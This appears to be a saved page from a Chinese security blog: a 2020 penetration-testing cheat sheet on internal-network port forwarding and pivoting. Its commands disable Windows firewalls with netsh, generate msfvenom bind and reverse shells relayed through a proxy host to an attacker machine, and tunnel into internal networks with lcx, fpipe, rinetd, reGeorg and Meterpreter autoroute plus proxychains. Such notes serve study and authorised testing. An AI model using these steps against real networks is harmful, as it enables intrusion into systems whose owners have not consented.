@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>内网端口转发总结 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">内网端口转发总结</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>Windows</strong></p>
+<!-- more -->
+<p>1.netsh是一个windows自带的网络管理工具，用于管理windows防火墙以及各类网络配置，<br>
+2003前</p>
+<pre><code>netsh firewall show state
+#查看防火墙状态
+netsh firewall set opmode disable
+#关闭防火墙
+netsh firewall set opmode enable
+#启用防火墙
+</code></pre>
+<p>2003后</p>
+<pre><code>netsh advfirewall show allprofiles
+#查看防火墙状态
+netsh advfirewall set allprofiles state off
+#关闭防火墙
+netsh advfirewall set allprofiles state on
+#开启防火墙
+netsh advfirewall reset
+#重置防火墙规则
+</code></pre>
+<p>添加防火墙规则</p>
+<pre><code>netsh advfirewall firewall add rule name=&quot;test&quot; dir=in action=allow protocol=TCP localport=53
+#允许外部连接本地TCP53端口
+netsh advfirewall firewall delete rule name=&quot;test&quot; dir=in protocol=TCP localport=53
+#删除规则
+netsh firewall add portopening TCP 53 &quot;test&quot;
+#打开53端口
+netsh firewall delete portopening TCP 53 &quot;test&quot;
+#关闭53端口
+netsh advfirewall firewall add rule name=&quot;test&quot; dir=out action=allow protocol=TCP localport=53
+#允许本地53端口出去
+netsh firewall add allowedprogram c:\nc.exe &quot;test&quot; enable
+#允许改进程所有连接
+netsh advfirewall firewall add rule name=&quot;test&quot; dir=in action=allow program=&quot;c:\nx.exe&quot;
+#允许本地nc.exe入站
+</code></pre>
+<p>通过netsh端口转发</p>
+<pre><code>netsh advfirewall firewall add rule name=&quot;ssh&quot; dir=in action=allow protocol=TCP localport=8080
+#允许外部8080端口连入
+netsh interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.0.110 connectport=22
+#将192.168.0.110的22端口。转发到本地8080端口
+netsh interface portproxy show all
+#查看转发规则
+</code></pre>
+<p>生成正向反向木马</p>
+<pre><code>msfvenom -p xxxx LHOST=内网受害者IP LPORT=1234
+#生成木马，IP要是受害者IP
+netsh interface portproxy add v4tov4 listenport=1234 connectaddress=受害者IP connectport=1234
+#将木马的绑定端口。转发到本地1234。msf连接本地1234端口=连接受害者1234端口
+set RHOSTS=受害者IP
+set LHOST=本机IP
+#bind_tcp连接
+msfvenom -p xxx LHOST=中间代理机IP LPORT=1234
+#生成木马，IP为代理机IP
+netsh interface portproxy add v4tov4 listenport=1234 connectaddress=攻击机kali connectport=1234
+#因为是反向连接，内网受害者IP-&gt;代理机-&gt;kali，在中间代理转发，将shell转发到kali上
+#与正向连接不同的是，正向kali通过代理去访问受害者。反向是受害者访问代理。代理转发shell给kali
+set RHOSTS=本机IP
+set LHOSTS=1234
+#reverse_tcp连接
+</code></pre>
+<p>2.lcx</p>
+<pre><code>lcx -tran 53 192.168.0.110 22
+#将本地53端口转发给192.168.0.110的22端口
+#ssh root@代理机IP -p 53==ssh root@192.168.0.110 -p 22
+lcx -slave 代理IP 53 内网受害者IP 3389
+lcx -listen 53 1080
+#将受害者IP的3389转发给代理机的53端口
+#将本地53端口的流量转发给1080端口
+对于正向和反向shell，差不多。同样是转发端口。连接就行了,理清思路，谁转发给谁，谁接收
+</code></pre>
+<p>3.fpipe</p>
+<pre><code>fpipe.exe -l 8080 -i 0.0.0.0 -s 8080 -r 3389 内网受害者IP
+将本地8080端口。重定向到内网受害者的3389端口,大同小异。只不过工具不一样。思路都是一样的
+</code></pre>
+<p>Linux:<br>
+1.rinetd</p>
+<pre><code>git clone https://github.com/boutell/rinetd.git
+cd rinted
+mkdir -p /usr/man/man8
+make &amp;&amp;make install
+#安装结束
+vim rinetd.conf
+0.0.0.0 1080 192.168.0.110 22
+0.0.0.0 1081 192.168.0.120 1234
+allow *.*.*.*
+#创建配置文件，本地监听1080端口。转发110的22端口。1081转发120的1234端口
+rinetd -c rinetd.conf
+#启动服务
+</code></pre>
+<p>2.portmap</p>
+<pre><code>这里有一个-m参数这个参数的解释：以哪种方式来用这个工具，然后下面有三个方式
+./lcx -m 1 -p1 1234 -h2 受害者IP -p2 3389
+1.监听port1 端口并且连接主机2的port2 端口
+#连接本地1234端口。转发到受害者的3389端口
+./lcx -m 2 -p1 1080 -p2 1235
+2.监听port1和port2 端口。
+#将本地的1080端口转发到1235端口
+./lcx -m 3 -h1 代理IP -p1 1080 -h2 受害者IP -p2 2289
+3.连接主机1对应的端口和主机2对应的端口
+#代理IP的1080端口转发到受害者IP的2289端口
+</code></pre>
+<p>3.reGeorg</p>
+<pre><code>git clone https://github.com/sensepost/reGeorg.git
+#将对应的文件放到代理机器上，比如代理机php的，就放php的文件
+python reGeorgSocksProxy.py -p 2333 -u http://代理IP/tunnel.php
+#本地转发2333端口
+写入proxychains
+socks5 127.0.0.1 2333
+</code></pre>
+<p>msf内网通信：</p>
+<pre><code>portfwd add -l 3389 -p 3389 -r 受害者IP
+将本地的3389端口转发到受害者的3389
+listen 1234 受害者IP:端口
+同上
+run autoroute -s 7.7.7.0/24
+自动添加一条7.7.7.0网段的路由
+use auxiliary/server/socks4a
+run
+vim /etc/proxychains.conf
+最后添加一行socks4a配置的ip和端口，如下
+socks4 127.0.0.1 1080
+proxychains nmap -sT -Pn xxxx
+通过这个代理工具就能直接入侵内网了
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/VMYz6HDSq/">
+                  <h3 class="post-title">
+                    JSON注入
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
